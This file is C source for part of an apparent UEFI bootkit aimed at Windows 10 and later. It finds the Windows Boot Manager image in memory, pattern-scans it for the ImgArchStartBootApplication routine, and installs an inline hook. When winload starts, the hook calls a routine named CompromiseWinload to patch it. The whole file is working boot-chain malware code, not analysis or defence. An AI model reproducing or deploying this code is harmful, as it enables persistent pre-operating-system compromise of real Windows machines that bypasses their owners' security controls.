#include <Uefi.h>

#include <Library/UefiLib.h>
#include <Library/BaseLib.h>

#include <Protocol/LoadedImage.h>

#include "utils.h"
#include "globals.h"
#include "hook.h"

#define WINDOWS_BOOT_APPLICATION	0x0010

typedef EFI_STATUS(EFIAPI *ImgArchStartBootApplication)(VOID *AppEntry, VOID *ImageBase, UINT32 ImageSize, UINT8 BootOptions, VOID *RetArgs);

HOOK hImgArchStartBootApplication;

// Valid only for win 10+ (not tested on 11)
static CONST UINT8 ImgArchStartBootApplicationPattern[] = {
	0x48, 0x8B, 0xC4,			// mov     rax, rsp
	0x48, 0x89, 0x58, 0x20,		// mov     [rax+20h], rbx
	0x44, 0x89, 0x40, 0x18,		// mov     [rax+18h], r8d
	0x48, 0x89, 0x50, 0x10,		// mov     [rax+10h], rdx
	0x48, 0x89, 0x48, 0x08,		// mov     [rax+8], rcx
	0x55,						// push    rbp
	0x56,						// push    rsi
	0x57,						// push    rdi
	0x41, 0x54					// push    r12
};


EFI_STATUS
EFIAPI
HkImgArchStartBootApplication(
	IN VOID		*AppEntry,
	IN VOID		*ImageBase,
	IN UINT32   ImageSize,
	IN UINT8    BootOptions,
	IN VOID		*RetArgs
) {
	EFI_STATUS Status = EFI_NOT_FOUND;

	Print(L"\n\r[+] Hooked ImgArchStartBootApplication!\n\r");
	Sleep(2);

	VOID *Original = hImgArchStartBootApplication.OriginalAddress;

	UninstallHook(&hImgArchStartBootApplication);

	// Get EFI_IMAGE_NT_HEADERS64 to.. get image base and image size
	EFI_IMAGE_NT_HEADERS64 *NtHeaders64;
	NtHeaders64 = GetNtHeaders64(ImageBase);
	if(NtHeaders64 != NULL) {
		// Winload subsystem, sanity check
		if(NtHeaders64->OptionalHeader.Subsystem == WINDOWS_BOOT_APPLICATION) {
			VOID *WinloadImageBase = (VOID *)NtHeaders64->OptionalHeader.ImageBase;
			UINTN WinloadImageSize = NtHeaders64->OptionalHeader.SizeOfImage;

			// Modify winload
			Status = CompromiseWinload(WinloadImageBase, WinloadImageSize, NtHeaders64);
			if(EFI_ERROR(Status))
				Print(L"\n\r[!] Received 0x%llx (%r) status! All info will be displayed soon!\n\r", Status, Status);
		} else {
			SetGlobalPatchStatus(Status, L"Cannot find windows bootloader!", (VOID *)HkImgArchStartBootApplication);
		}
	} else {
		SetGlobalPatchStatus(Status, L"Cannot get EFI_IMAGE_NT_HEADERS64 of winload!", (VOID*)HkImgArchStartBootApplication);
	}

	return ((ImgArchStartBootApplication)Original)(AppEntry, ImageBase, ImageSize, BootOptions, RetArgs);
}

EFI_STATUS
EFIAPI
CompromiseBootmgfw(
	IN EFI_HANDLE	BootmgfwHandle
) {
	EFI_STATUS Status = EFI_NOT_FOUND;

	EFI_LOADED_IMAGE *BootmgfwImage;

	Status = gBS->HandleProtocol(BootmgfwHandle, &gEfiLoadedImageProtocolGuid, (VOID **)&BootmgfwImage);
	if(EFI_ERROR(Status)) {
		SetGlobalPatchStatus(Status, L"Cannot locate loaded image protocol!", (VOID *)CompromiseBootmgfw);

		return Status;
	}

	VOID *BootmgfwBase = BootmgfwImage->ImageBase;
	UINTN BootmgfwSize = BootmgfwImage->ImageSize;

	Print(L"[ bootmgfw ]\n\r");
	Print(L"[+] Bootmgfw image base: 0x%llx\n\r", BootmgfwBase);
	Print(L"[+] Bootmgfw image size: %lld\n\r", BootmgfwSize);

	// We can also find address of Archpx64TransferTo64BitApplicationAsm function and hook it (function used for loading winload either).
	// Anyway, it's better and easier hooking ImgArchStartBootApplication, because we already have everything we need. 
	// This is also easier because in the case of the Archpx64TransferTo64BitApplicationAsm hook 
	// we have to "iterate" through rax (a non-exportable function is placed in rax and called) and looking for MZ and NT signatures
	VOID *ImgArchStartBootApplicationOriginal = ScanForPattern((UINT8 *)BootmgfwBase, BootmgfwSize, ImgArchStartBootApplicationPattern);
	if(ImgArchStartBootApplicationOriginal == NULL) {
		Status = EFI_NOT_FOUND;

		SetGlobalPatchStatus(Status, L"Cannot find pattern for ImgArchStartBootApplication function!", &CompromiseBootmgfw);

		return Status;
	}

	Print(L"\n\r[+] ImgArchStartBootApplication address: 0x%llx\n\r", ImgArchStartBootApplicationOriginal);
	Print(L"[+] HkImgArchStartBootApplication address: 0x%llx\n\r", &HkImgArchStartBootApplication);

	InitHook(&hImgArchStartBootApplication, ImgArchStartBootApplicationOriginal, &HkImgArchStartBootApplication);
	InstallHook(&hImgArchStartBootApplication);
	
	return EFI_SUCCESS;
}